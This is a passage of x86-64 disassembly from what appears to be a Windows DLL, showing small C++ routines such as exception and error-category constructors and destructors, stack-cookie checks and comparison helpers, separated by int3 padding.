   180001ebf:	49 8b e9             	mov    %r9,%rbp
   180001ec2:	4c 8d b4 24 90 00 00 	lea    0x90(%rsp),%r14
   180001ec9:	00 
   180001eca:	49 8b f0             	mov    %r8,%rsi
   180001ecd:	48 8b fa             	mov    %rdx,%rdi
   180001ed0:	48 8b d9             	mov    %rcx,%rbx
   180001ed3:	e8 68 ff ff ff       	call   0x180001e40
   180001ed8:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   180001edd:	4c 8b ce             	mov    %rsi,%r9
   180001ee0:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   180001ee7:	00 00 
   180001ee9:	4c 8b c7             	mov    %rdi,%r8
   180001eec:	48 8b d3             	mov    %rbx,%rdx
   180001eef:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   180001ef4:	48 8b 08             	mov    (%rax),%rcx
   180001ef7:	e8 98 7b 01 00       	call   0x180019a94
   180001efc:	85 c0                	test   %eax,%eax
   180001efe:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   180001f03:	0f 48 c1             	cmovs  %ecx,%eax
   180001f06:	48 83 c4 40          	add    $0x40,%rsp
   180001f0a:	41 5e                	pop    %r14
   180001f0c:	5f                   	pop    %rdi
   180001f0d:	5e                   	pop    %rsi
   180001f0e:	5d                   	pop    %rbp
   180001f0f:	5b                   	pop    %rbx
   180001f10:	c3                   	ret
   180001f11:	cc                   	int3
   180001f12:	cc                   	int3
   180001f13:	cc                   	int3
   180001f14:	cc                   	int3
   180001f15:	cc                   	int3
   180001f16:	cc                   	int3
   180001f17:	cc                   	int3
   180001f18:	cc                   	int3
   180001f19:	cc                   	int3
   180001f1a:	cc                   	int3
   180001f1b:	cc                   	int3
   180001f1c:	cc                   	int3
   180001f1d:	cc                   	int3
   180001f1e:	cc                   	int3
   180001f1f:	cc                   	int3
   180001f20:	40 53                	rex push %rbx
   180001f22:	48 83 ec 20          	sub    $0x20,%rsp
   180001f26:	48 8b d9             	mov    %rcx,%rbx
   180001f29:	48 8b c2             	mov    %rdx,%rax
   180001f2c:	48 8d 0d dd 25 03 00 	lea    0x325dd(%rip),%rcx        # 0x180034510
   180001f33:	0f 57 c0             	xorps  %xmm0,%xmm0
   180001f36:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180001f3a:	48 89 0b             	mov    %rcx,(%rbx)
   180001f3d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180001f41:	0f 11 02             	movups %xmm0,(%rdx)
   180001f44:	e8 8f d5 00 00       	call   0x18000f4d8
   180001f49:	48 8b c3             	mov    %rbx,%rax
   180001f4c:	48 83 c4 20          	add    $0x20,%rsp
   180001f50:	5b                   	pop    %rbx
   180001f51:	c3                   	ret
   180001f52:	cc                   	int3
   180001f53:	cc                   	int3
   180001f54:	cc                   	int3
   180001f55:	cc                   	int3
   180001f56:	cc                   	int3
   180001f57:	cc                   	int3
   180001f58:	cc                   	int3
   180001f59:	cc                   	int3
   180001f5a:	cc                   	int3
   180001f5b:	cc                   	int3
   180001f5c:	cc                   	int3
   180001f5d:	cc                   	int3
   180001f5e:	cc                   	int3
   180001f5f:	cc                   	int3
   180001f60:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   180001f64:	48 8d 05 25 0b 04 00 	lea    0x40b25(%rip),%rax        # 0x180042a90
   180001f6b:	48 85 d2             	test   %rdx,%rdx
   180001f6e:	48 0f 45 c2          	cmovne %rdx,%rax
   180001f72:	c3                   	ret
   180001f73:	cc                   	int3
   180001f74:	cc                   	int3
   180001f75:	cc                   	int3
   180001f76:	cc                   	int3
   180001f77:	cc                   	int3
   180001f78:	cc                   	int3
   180001f79:	cc                   	int3
   180001f7a:	cc                   	int3
   180001f7b:	cc                   	int3
   180001f7c:	cc                   	int3
   180001f7d:	cc                   	int3
   180001f7e:	cc                   	int3
   180001f7f:	cc                   	int3
   180001f80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001f85:	57                   	push   %rdi
   180001f86:	48 83 ec 20          	sub    $0x20,%rsp
   180001f8a:	48 8d 05 7f 25 03 00 	lea    0x3257f(%rip),%rax        # 0x180034510
   180001f91:	48 8b f9             	mov    %rcx,%rdi
   180001f94:	48 89 01             	mov    %rax,(%rcx)
   180001f97:	8b da                	mov    %edx,%ebx
   180001f99:	48 83 c1 08          	add    $0x8,%rcx
   180001f9d:	e8 c6 d5 00 00       	call   0x18000f568
   180001fa2:	f6 c3 01             	test   $0x1,%bl
   180001fa5:	74 0d                	je     0x180001fb4
   180001fa7:	ba 18 00 00 00       	mov    $0x18,%edx
   180001fac:	48 8b cf             	mov    %rdi,%rcx
   180001faf:	e8 d8 a8 00 00       	call   0x18000c88c
   180001fb4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001fb9:	48 8b c7             	mov    %rdi,%rax
   180001fbc:	48 83 c4 20          	add    $0x20,%rsp
   180001fc0:	5f                   	pop    %rdi
   180001fc1:	c3                   	ret
   180001fc2:	cc                   	int3
   180001fc3:	cc                   	int3
   180001fc4:	cc                   	int3
   180001fc5:	cc                   	int3
   180001fc6:	cc                   	int3
   180001fc7:	cc                   	int3
   180001fc8:	cc                   	int3
   180001fc9:	cc                   	int3
   180001fca:	cc                   	int3
   180001fcb:	cc                   	int3
   180001fcc:	cc                   	int3
   180001fcd:	cc                   	int3
   180001fce:	cc                   	int3
   180001fcf:	cc                   	int3
   180001fd0:	48 8d 05 39 25 03 00 	lea    0x32539(%rip),%rax        # 0x180034510
   180001fd7:	48 89 01             	mov    %rax,(%rcx)
   180001fda:	48 83 c1 08          	add    $0x8,%rcx
   180001fde:	e9 85 d5 00 00       	jmp    0x18000f568
   180001fe3:	cc                   	int3
   180001fe4:	cc                   	int3
   180001fe5:	cc                   	int3
   180001fe6:	cc                   	int3
   180001fe7:	cc                   	int3
   180001fe8:	cc                   	int3
   180001fe9:	cc                   	int3
   180001fea:	cc                   	int3
   180001feb:	cc                   	int3
   180001fec:	cc                   	int3
   180001fed:	cc                   	int3
   180001fee:	cc                   	int3
   180001fef:	cc                   	int3
   180001ff0:	48 8d 05 b1 0a 04 00 	lea    0x40ab1(%rip),%rax        # 0x180042aa8
   180001ff7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   180001ffe:	00 
   180001fff:	48 89 41 08          	mov    %rax,0x8(%rcx)
   180002003:	48 8d 05 46 25 03 00 	lea    0x32546(%rip),%rax        # 0x180034550
   18000200a:	48 89 01             	mov    %rax,(%rcx)
   18000200d:	48 8b c1             	mov    %rcx,%rax
   180002010:	c3                   	ret
   180002011:	cc                   	int3
   180002012:	cc                   	int3
   180002013:	cc                   	int3
   180002014:	cc                   	int3
   180002015:	cc                   	int3
   180002016:	cc                   	int3
   180002017:	cc                   	int3
   180002018:	cc                   	int3
   180002019:	cc                   	int3
   18000201a:	cc                   	int3
   18000201b:	cc                   	int3
   18000201c:	cc                   	int3
   18000201d:	cc                   	int3
   18000201e:	cc                   	int3
   18000201f:	cc                   	int3
   180002020:	48 83 ec 48          	sub    $0x48,%rsp
   180002024:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002029:	e8 c2 ff ff ff       	call   0x180001ff0
   18000202e:	48 8d 15 c3 5b 04 00 	lea    0x45bc3(%rip),%rdx        # 0x180047bf8
   180002035:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000203a:	e8 f5 d5 00 00       	call   0x18000f634
   18000203f:	cc                   	int3
   180002040:	40 53                	rex push %rbx
   180002042:	48 83 ec 20          	sub    $0x20,%rsp
   180002046:	48 8b d9             	mov    %rcx,%rbx
   180002049:	48 8b c2             	mov    %rdx,%rax
   18000204c:	48 8d 0d bd 24 03 00 	lea    0x324bd(%rip),%rcx        # 0x180034510
   180002053:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002056:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000205a:	48 89 0b             	mov    %rcx,(%rbx)
   18000205d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180002061:	0f 11 02             	movups %xmm0,(%rdx)
   180002064:	e8 6f d4 00 00       	call   0x18000f4d8
   180002069:	48 8d 05 e0 24 03 00 	lea    0x324e0(%rip),%rax        # 0x180034550
   180002070:	48 89 03             	mov    %rax,(%rbx)
   180002073:	48 8b c3             	mov    %rbx,%rax
   180002076:	48 83 c4 20          	add    $0x20,%rsp
   18000207a:	5b                   	pop    %rbx
   18000207b:	c3                   	ret
   18000207c:	cc                   	int3
   18000207d:	cc                   	int3
   18000207e:	cc                   	int3
   18000207f:	cc                   	int3
   180002080:	40 53                	rex push %rbx
   180002082:	48 83 ec 20          	sub    $0x20,%rsp
   180002086:	48 8b d9             	mov    %rcx,%rbx
   180002089:	48 8b c2             	mov    %rdx,%rax
   18000208c:	48 8d 0d 7d 24 03 00 	lea    0x3247d(%rip),%rcx        # 0x180034510
   180002093:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002096:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   18000209a:	48 89 0b             	mov    %rcx,(%rbx)
   18000209d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800020a1:	0f 11 02             	movups %xmm0,(%rdx)
   1800020a4:	e8 2f d4 00 00       	call   0x18000f4d8
   1800020a9:	48 8d 05 78 24 03 00 	lea    0x32478(%rip),%rax        # 0x180034528
   1800020b0:	48 89 03             	mov    %rax,(%rbx)
   1800020b3:	48 8b c3             	mov    %rbx,%rax
   1800020b6:	48 83 c4 20          	add    $0x20,%rsp
   1800020ba:	5b                   	pop    %rbx
   1800020bb:	c3                   	ret
   1800020bc:	cc                   	int3
   1800020bd:	cc                   	int3
   1800020be:	cc                   	int3
   1800020bf:	cc                   	int3
   1800020c0:	48 83 ec 28          	sub    $0x28,%rsp
   1800020c4:	48 8d 0d f5 09 04 00 	lea    0x409f5(%rip),%rcx        # 0x180042ac0
   1800020cb:	e8 04 b6 00 00       	call   0x18000d6d4
   1800020d0:	cc                   	int3
   1800020d1:	cc                   	int3
   1800020d2:	cc                   	int3
   1800020d3:	cc                   	int3
   1800020d4:	cc                   	int3
   1800020d5:	cc                   	int3
   1800020d6:	cc                   	int3
   1800020d7:	cc                   	int3
   1800020d8:	cc                   	int3
   1800020d9:	cc                   	int3
   1800020da:	cc                   	int3
   1800020db:	cc                   	int3
   1800020dc:	cc                   	int3
   1800020dd:	cc                   	int3
   1800020de:	cc                   	int3
   1800020df:	cc                   	int3
   1800020e0:	40 53                	rex push %rbx
   1800020e2:	48 83 ec 40          	sub    $0x40,%rsp
   1800020e6:	48 8b 05 23 6f 04 00 	mov    0x46f23(%rip),%rax        # 0x180049010
   1800020ed:	48 33 c4             	xor    %rsp,%rax
   1800020f0:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1800020f5:	4c 8b c2             	mov    %rdx,%r8
   1800020f8:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   1800020fd:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   180002101:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   180002106:	48 8d 05 03 24 03 00 	lea    0x32403(%rip),%rax        # 0x180034510
   18000210d:	48 8b d9             	mov    %rcx,%rbx
   180002110:	48 89 01             	mov    %rax,(%rcx)
   180002113:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002116:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000211b:	0f 11 02             	movups %xmm0,(%rdx)
   18000211e:	e8 b5 d3 00 00       	call   0x18000f4d8
   180002123:	48 8d 05 86 24 03 00 	lea    0x32486(%rip),%rax        # 0x1800345b0
   18000212a:	48 89 03             	mov    %rax,(%rbx)
   18000212d:	48 8b c3             	mov    %rbx,%rax
   180002130:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   180002135:	48 33 cc             	xor    %rsp,%rcx
   180002138:	e8 93 a4 00 00       	call   0x18000c5d0
   18000213d:	48 83 c4 40          	add    $0x40,%rsp
   180002141:	5b                   	pop    %rbx
   180002142:	c3                   	ret
   180002143:	cc                   	int3
   180002144:	cc                   	int3
   180002145:	cc                   	int3
   180002146:	cc                   	int3
   180002147:	cc                   	int3
   180002148:	cc                   	int3
   180002149:	cc                   	int3
   18000214a:	cc                   	int3
   18000214b:	cc                   	int3
   18000214c:	cc                   	int3
   18000214d:	cc                   	int3
   18000214e:	cc                   	int3
   18000214f:	cc                   	int3
   180002150:	40 53                	rex push %rbx
   180002152:	48 83 ec 40          	sub    $0x40,%rsp
   180002156:	48 8b 05 b3 6e 04 00 	mov    0x46eb3(%rip),%rax        # 0x180049010
   18000215d:	48 33 c4             	xor    %rsp,%rax
   180002160:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180002165:	4c 8b c2             	mov    %rdx,%r8
   180002168:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   18000216d:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   180002171:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   180002176:	48 8d 05 93 23 03 00 	lea    0x32393(%rip),%rax        # 0x180034510
   18000217d:	48 8b d9             	mov    %rcx,%rbx
   180002180:	48 89 01             	mov    %rax,(%rcx)
   180002183:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002186:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000218b:	0f 11 02             	movups %xmm0,(%rdx)
   18000218e:	e8 45 d3 00 00       	call   0x18000f4d8
   180002193:	48 8d 05 2e 24 03 00 	lea    0x3242e(%rip),%rax        # 0x1800345c8
   18000219a:	48 89 03             	mov    %rax,(%rbx)
   18000219d:	48 8b c3             	mov    %rbx,%rax
   1800021a0:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1800021a5:	48 33 cc             	xor    %rsp,%rcx
   1800021a8:	e8 23 a4 00 00       	call   0x18000c5d0
   1800021ad:	48 83 c4 40          	add    $0x40,%rsp
   1800021b1:	5b                   	pop    %rbx
   1800021b2:	c3                   	ret
   1800021b3:	cc                   	int3
   1800021b4:	cc                   	int3
   1800021b5:	cc                   	int3
   1800021b6:	cc                   	int3
   1800021b7:	cc                   	int3
   1800021b8:	cc                   	int3
   1800021b9:	cc                   	int3
   1800021ba:	cc                   	int3
   1800021bb:	cc                   	int3
   1800021bc:	cc                   	int3
   1800021bd:	cc                   	int3
   1800021be:	cc                   	int3
   1800021bf:	cc                   	int3
   1800021c0:	40 53                	rex push %rbx
   1800021c2:	48 83 ec 20          	sub    $0x20,%rsp
   1800021c6:	48 8b d9             	mov    %rcx,%rbx
   1800021c9:	48 8b c2             	mov    %rdx,%rax
   1800021cc:	48 8d 0d 3d 23 03 00 	lea    0x3233d(%rip),%rcx        # 0x180034510
   1800021d3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800021d6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1800021da:	48 89 0b             	mov    %rcx,(%rbx)
   1800021dd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1800021e1:	0f 11 02             	movups %xmm0,(%rdx)
   1800021e4:	e8 ef d2 00 00       	call   0x18000f4d8
   1800021e9:	48 8d 05 c0 23 03 00 	lea    0x323c0(%rip),%rax        # 0x1800345b0
   1800021f0:	48 89 03             	mov    %rax,(%rbx)
   1800021f3:	48 8b c3             	mov    %rbx,%rax
   1800021f6:	48 83 c4 20          	add    $0x20,%rsp
   1800021fa:	5b                   	pop    %rbx
   1800021fb:	c3                   	ret
   1800021fc:	cc                   	int3
   1800021fd:	cc                   	int3
   1800021fe:	cc                   	int3
   1800021ff:	cc                   	int3
   180002200:	44 89 02             	mov    %r8d,(%rdx)
   180002203:	48 8b c2             	mov    %rdx,%rax
   180002206:	48 89 4a 08          	mov    %rcx,0x8(%rdx)
   18000220a:	c3                   	ret
   18000220b:	cc                   	int3
   18000220c:	cc                   	int3
   18000220d:	cc                   	int3
   18000220e:	cc                   	int3
   18000220f:	cc                   	int3
   180002210:	40 53                	rex push %rbx
   180002212:	48 83 ec 30          	sub    $0x30,%rsp
   180002216:	48 8b 01             	mov    (%rcx),%rax
   180002219:	49 8b d8             	mov    %r8,%rbx
   18000221c:	44 8b c2             	mov    %edx,%r8d
   18000221f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   180002224:	ff 50 18             	call   *0x18(%rax)
   180002227:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   18000222b:	4c 8b 48 08          	mov    0x8(%rax),%r9
   18000222f:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   180002233:	49 39 51 08          	cmp    %rdx,0x8(%r9)
   180002237:	75 0e                	jne    0x180002247
   180002239:	8b 0b                	mov    (%rbx),%ecx
   18000223b:	39 08                	cmp    %ecx,(%rax)
   18000223d:	75 08                	jne    0x180002247
   18000223f:	b0 01                	mov    $0x1,%al
   180002241:	48 83 c4 30          	add    $0x30,%rsp
   180002245:	5b                   	pop    %rbx
   180002246:	c3                   	ret
   180002247:	32 c0                	xor    %al,%al
   180002249:	48 83 c4 30          	add    $0x30,%rsp
   18000224d:	5b                   	pop    %rbx
   18000224e:	c3                   	ret
   18000224f:	cc                   	int3
   180002250:	48 8b 42 08          	mov    0x8(%rdx),%rax
   180002254:	4c 8b 48 08          	mov    0x8(%rax),%r9
   180002258:	4c 39 49 08          	cmp    %r9,0x8(%rcx)
   18000225c:	75 08                	jne    0x180002266
   18000225e:	44 39 02             	cmp    %r8d,(%rdx)
   180002261:	75 03                	jne    0x180002266
   180002263:	b0 01                	mov    $0x1,%al
   180002265:	c3                   	ret
   180002266:	32 c0                	xor    %al,%al
   180002268:	c3                   	ret
   180002269:	cc                   	int3
   18000226a:	cc                   	int3
   18000226b:	cc                   	int3
   18000226c:	cc                   	int3
   18000226d:	cc                   	int3
   18000226e:	cc                   	int3
   18000226f:	cc                   	int3
   180002270:	48 8d 05 e9 79 04 00 	lea    0x479e9(%rip),%rax        # 0x180049c60
   180002277:	89 11                	mov    %edx,(%rcx)
   180002279:	48 89 41 08          	mov    %rax,0x8(%rcx)
   18000227d:	48 8b c1             	mov    %rcx,%rax
   180002280:	c3                   	ret
   180002281:	cc                   	int3
   180002282:	cc                   	int3
   180002283:	cc                   	int3
   180002284:	cc                   	int3
   180002285:	cc                   	int3
   180002286:	cc                   	int3
   180002287:	cc                   	int3
   180002288:	cc                   	int3
   180002289:	cc                   	int3
   18000228a:	cc                   	int3
   18000228b:	cc                   	int3
   18000228c:	cc                   	int3
   18000228d:	cc                   	int3
   18000228e:	cc                   	int3
   18000228f:	cc                   	int3
   180002290:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180002295:	55                   	push   %rbp
   180002296:	56                   	push   %rsi
   180002297:	57                   	push   %rdi
   180002298:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   18000229d:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   1800022a4:	48 8b 05 65 6d 04 00 	mov    0x46d65(%rip),%rax        # 0x180049010
   1800022ab:	48 33 c4             	xor    %rsp,%rax
   1800022ae:	48 89 45 37          	mov    %rax,0x37(%rbp)
   1800022b2:	48 8b f2             	mov    %rdx,%rsi
   1800022b5:	48 8b d9             	mov    %rcx,%rbx
   1800022b8:	48 89 4d c7          	mov    %rcx,-0x39(%rbp)
   1800022bc:	49 8b d0             	mov    %r8,%rdx
   1800022bf:	48 8d 4d ef          	lea    -0x11(%rbp),%rcx
   1800022c3:	e8 78 5f 00 00       	call   0x180008240
   1800022c8:	48 8b f8             	mov    %rax,%rdi
   1800022cb:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   1800022cf:	0f 10 06             	movups (%rsi),%xmm0
   1800022d2:	0f 29 45 17          	movaps %xmm0,0x17(%rbp)
   1800022d6:	48 83 78 10 00       	cmpq   $0x0,0x10(%rax)
   1800022db:	74 15                	je     0x1800022f2
   1800022dd:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1800022e3:	48 8d 15 e6 07 04 00 	lea    0x407e6(%rip),%rdx        # 0x180042ad0
   1800022ea:	48 8b c8             	mov    %rax,%rcx
   1800022ed:	e8 fe 6a 00 00       	call   0x180008df0
   1800022f2:	48 8b 4d 1f          	mov    0x1f(%rbp),%rcx
   1800022f6:	48 8b 01             	mov    (%rcx),%rax
   1800022f9:	44 8b 45 17          	mov    0x17(%rbp),%r8d
   1800022fd:	48 8d 55 17          	lea    0x17(%rbp),%rdx
   180002301:	ff 50 10             	call   *0x10(%rax)
   180002304:	90                   	nop
   180002305:	48 8d 55 17          	lea    0x17(%rbp),%rdx
   180002309:	48 83 7d 2f 10       	cmpq   $0x10,0x2f(%rbp)
   18000230e:	48 0f 43 55 17       	cmovae 0x17(%rbp),%rdx
   180002313:	4c 8b 45 27          	mov    0x27(%rbp),%r8
   180002317:	48 8b cf             	mov    %rdi,%rcx
   18000231a:	e8 d1 6a 00 00       	call   0x180008df0
   18000231f:	90                   	nop
   180002320:	48 8b 55 2f          	mov    0x2f(%rbp),%rdx
   180002324:	48 83 fa 10          	cmp    $0x10,%rdx
   180002328:	72 31                	jb     0x18000235b
   18000232a:	48 ff c2             	inc    %rdx
   18000232d:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   180002331:	48 8b c1             	mov    %rcx,%rax
   180002334:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   18000233b:	72 19                	jb     0x180002356
   18000233d:	48 83 c2 27          	add    $0x27,%rdx
   180002341:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   180002345:	48 2b c1             	sub    %rcx,%rax
   180002348:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   18000234c:	48 83 f8 1f          	cmp    $0x1f,%rax
   180002350:	0f 87 d4 00 00 00    	ja     0x18000242a
   180002356:	e8 31 a5 00 00       	call   0x18000c88c
   18000235b:	0f 10 07             	movups (%rdi),%xmm0
   18000235e:	0f 11 45 cf          	movups %xmm0,-0x31(%rbp)
   180002362:	0f 10 4f 10          	movups 0x10(%rdi),%xmm1
   180002366:	0f 11 4d df          	movups %xmm1,-0x21(%rbp)
   18000236a:	48 c7 47 10 00 00 00 	movq   $0x0,0x10(%rdi)
   180002371:	00 
   180002372:	48 c7 47 18 0f 00 00 	movq   $0xf,0x18(%rdi)
   180002379:	00 
   18000237a:	c6 07 00             	movb   $0x0,(%rdi)
   18000237d:	48 8d 45 cf          	lea    -0x31(%rbp),%rax
   180002381:	48 83 7d e7 10       	cmpq   $0x10,-0x19(%rbp)
   180002386:	48 0f 43 45 cf       	cmovae -0x31(%rbp),%rax
   18000238b:	48 8d 0d 7e 21 03 00 	lea    0x3217e(%rip),%rcx        # 0x180034510
   180002392:	48 89 0b             	mov    %rcx,(%rbx)
   180002395:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180002399:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000239c:	0f 11 02             	movups %xmm0,(%rdx)
   18000239f:	48 89 45 17          	mov    %rax,0x17(%rbp)
   1800023a3:	c6 45 1f 01          	movb   $0x1,0x1f(%rbp)
   1800023a7:	48 8d 4d 17          	lea    0x17(%rbp),%rcx
   1800023ab:	e8 28 d1 00 00       	call   0x18000f4d8
   1800023b0:	48 8d 05 f9 21 03 00 	lea    0x321f9(%rip),%rax        # 0x1800345b0
   1800023b7:	48 89 03             	mov    %rax,(%rbx)
   1800023ba:	48 8b 55 e7          	mov    -0x19(%rbp),%rdx
   1800023be:	48 83 fa 10          	cmp    $0x10,%rdx
   1800023c2:	72 2d                	jb     0x1800023f1
   1800023c4:	48 ff c2             	inc    %rdx
   1800023c7:	48 8b 4d cf          	mov    -0x31(%rbp),%rcx
   1800023cb:	48 8b c1             	mov    %rcx,%rax
   1800023ce:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1800023d5:	72 15                	jb     0x1800023ec
   1800023d7:	48 83 c2 27          	add    $0x27,%rdx
   1800023db:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1800023df:	48 2b c1             	sub    %rcx,%rax
   1800023e2:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1800023e6:	48 83 f8 1f          	cmp    $0x1f,%rax
   1800023ea:	77 38                	ja     0x180002424
   1800023ec:	e8 9b a4 00 00       	call   0x18000c88c
   1800023f1:	48 8d 05 30 22 03 00 	lea    0x32230(%rip),%rax        # 0x180034628
   1800023f8:	48 89 03             	mov    %rax,(%rbx)
   1800023fb:	0f 10 06             	movups (%rsi),%xmm0
   1800023fe:	0f 11 43 18          	movups %xmm0,0x18(%rbx)
   180002402:	48 8b c3             	mov    %rbx,%rax
   180002405:	48 8b 4d 37          	mov    0x37(%rbp),%rcx
   180002409:	48 33 cc             	xor    %rsp,%rcx
   18000240c:	e8 bf a1 00 00       	call   0x18000c5d0
   180002411:	48 8b 9c 24 d8 00 00 	mov    0xd8(%rsp),%rbx
   180002418:	00 
   180002419:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   180002420:	5f                   	pop    %rdi
   180002421:	5e                   	pop    %rsi
   180002422:	5d                   	pop    %rbp
   180002423:	c3                   	ret
   180002424:	e8 57 87 01 00       	call   0x18001ab80
   180002429:	90                   	nop
   18000242a:	e8 51 87 01 00       	call   0x18001ab80
   18000242f:	90                   	nop
   180002430:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002435:	57                   	push   %rdi
   180002436:	48 83 ec 20          	sub    $0x20,%rsp
   18000243a:	48 8d 05 cf 20 03 00 	lea    0x320cf(%rip),%rax        # 0x180034510
   180002441:	48 8b f9             	mov    %rcx,%rdi
   180002444:	48 89 01             	mov    %rax,(%rcx)
   180002447:	8b da                	mov    %edx,%ebx
   180002449:	48 83 c1 08          	add    $0x8,%rcx
   18000244d:	e8 16 d1 00 00       	call   0x18000f568
   180002452:	f6 c3 01             	test   $0x1,%bl
   180002455:	74 0d                	je     0x180002464
   180002457:	ba 28 00 00 00       	mov    $0x28,%edx
   18000245c:	48 8b cf             	mov    %rdi,%rcx
   18000245f:	e8 28 a4 00 00       	call   0x18000c88c
   180002464:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002469:	48 8b c7             	mov    %rdi,%rax
   18000246c:	48 83 c4 20          	add    $0x20,%rsp
   180002470:	5f                   	pop    %rdi
   180002471:	c3                   	ret
   180002472:	cc                   	int3
   180002473:	cc                   	int3
   180002474:	cc                   	int3
   180002475:	cc                   	int3
   180002476:	cc                   	int3
   180002477:	cc                   	int3
   180002478:	cc                   	int3
   180002479:	cc                   	int3
   18000247a:	cc                   	int3
   18000247b:	cc                   	int3
   18000247c:	cc                   	int3
   18000247d:	cc                   	int3
   18000247e:	cc                   	int3
   18000247f:	cc                   	int3
   180002480:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002485:	57                   	push   %rdi
   180002486:	48 83 ec 20          	sub    $0x20,%rsp
   18000248a:	48 8b da             	mov    %rdx,%rbx
   18000248d:	48 8d 05 7c 20 03 00 	lea    0x3207c(%rip),%rax        # 0x180034510
   180002494:	48 89 01             	mov    %rax,(%rcx)
   180002497:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   18000249b:	48 8b f9             	mov    %rcx,%rdi
   18000249e:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800024a1:	0f 11 02             	movups %xmm0,(%rdx)
   1800024a4:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   1800024a8:	e8 2b d0 00 00       	call   0x18000f4d8
   1800024ad:	48 8d 05 74 21 03 00 	lea    0x32174(%rip),%rax        # 0x180034628
   1800024b4:	48 89 07             	mov    %rax,(%rdi)
   1800024b7:	48 8d 05 82 21 03 00 	lea    0x32182(%rip),%rax        # 0x180034640
   1800024be:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   1800024c2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800024c7:	48 89 07             	mov    %rax,(%rdi)
   1800024ca:	48 8b c7             	mov    %rdi,%rax
   1800024cd:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   1800024d1:	48 83 c4 20          	add    $0x20,%rsp
   1800024d5:	5f                   	pop    %rdi
   1800024d6:	c3                   	ret
   1800024d7:	cc                   	int3
   1800024d8:	cc                   	int3
   1800024d9:	cc                   	int3
   1800024da:	cc                   	int3
   1800024db:	cc                   	int3
   1800024dc:	cc                   	int3
   1800024dd:	cc                   	int3
   1800024de:	cc                   	int3
   1800024df:	cc                   	int3
   1800024e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800024e5:	57                   	push   %rdi
   1800024e6:	48 83 ec 20          	sub    $0x20,%rsp
   1800024ea:	48 8b da             	mov    %rdx,%rbx
   1800024ed:	48 8d 05 1c 20 03 00 	lea    0x3201c(%rip),%rax        # 0x180034510
   1800024f4:	48 89 01             	mov    %rax,(%rcx)
   1800024f7:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   1800024fb:	48 8b f9             	mov    %rcx,%rdi
   1800024fe:	0f 57 c0             	xorps  %xmm0,%xmm0
   180002501:	0f 11 02             	movups %xmm0,(%rdx)
   180002504:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   180002508:	e8 cb cf 00 00       	call   0x18000f4d8
   18000250d:	48 8d 05 14 21 03 00 	lea    0x32114(%rip),%rax        # 0x180034628
   180002514:	48 89 07             	mov    %rax,(%rdi)
   180002517:	48 8b c7             	mov    %rdi,%rax
   18000251a:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   18000251e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002523:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   180002527:	48 83 c4 20          	add    $0x20,%rsp
   18000252b:	5f                   	pop    %rdi
   18000252c:	c3                   	ret
   18000252d:	cc                   	int3
   18000252e:	cc                   	int3
